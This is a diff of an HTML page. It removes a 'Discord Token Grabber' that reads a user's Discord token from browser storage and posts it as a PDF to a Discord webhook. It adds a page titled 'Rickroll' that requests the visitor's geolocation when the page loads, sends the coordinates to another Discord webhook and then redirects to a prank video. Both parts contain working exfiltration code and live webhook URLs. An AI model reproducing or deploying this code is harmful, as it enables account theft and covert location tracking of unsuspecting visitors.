@@ -1,50 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Grabber</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-    <script>
-        async function grabToken() {
-            // Get the Discord token from local storage
-            const token = localStorage.getItem('token');
-
-            // If token exists, create a PDF and send it to the webhook
-            if (token) {
-                const { jsPDF } = window.jspdf;
-
-                // Create a new PDF document
-                const pdf = new jsPDF();
-                pdf.text(`Discord Token: ${token}`, 10, 10);
-
-                // Generate the PDF as a Blob
-                const pdfBlob = pdf.output('blob');
-
-                // Create a FormData object to send the file
-                const formData = new FormData();
-                formData.append('file', pdfBlob, 'token.pdf');
-
-                try {
-                    // Send the PDF to the webhook
-                    const response = await fetch('https://discord.com/api/webhooks/1405973604235083899/jvNOpzcVs9GJ4nY84-YJdNY7lTfofwLzrGnK_iG2cbKUBq4I5YeiMOMG6LuzBhszyKum', {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    const data = await response.json();
-                    console.log('Success:', data);
-                } catch (error) {
-                    console.error('Error:', error);
-                }
-            } else {
-                console.log('No Discord token found.');
-            }
-        }
-    </script>
+    <title>Rickroll</title>
 </head>
 <body>
-    <h1>Click the button to send your Discord token in a PDF</h1>
-    <button onclick="grabToken()">Send Token as PDF</button>
+    <script>
+        // Funktion um die Geolocation des Benutzers zu erhalten
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Funktion um die Position an den Webhook zu senden
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Webhook-URL, an die die Daten gesendet werden
+            const webhookUrl = 'https://discord.com/api/webhooks/1406374866839535808/Fy7V05xk8u5zGUyQmz6ek2_wshrYnks_nc-Qk6RvwdY5qL8segzPDzWapXDrWjLEPeLo';
+
+            // Daten im JSON-Format vorbereiten
+            const data = JSON.stringify({
+                latitude: latitude,
+                longitude: longitude
+            });
+
+            // Fetch-Request an den Webhook senden
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: data
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                // Weiterleitung zur Rickroll-Seite
+                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                // Weiterleitung zur Rickroll-Seite, falls ein Fehler auftritt
+                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+            });
+        }
+
+        // Geolocation abrufen, wenn die Seite geladen wird
+        getLocation();
+    </script>
 </body>
 </html>
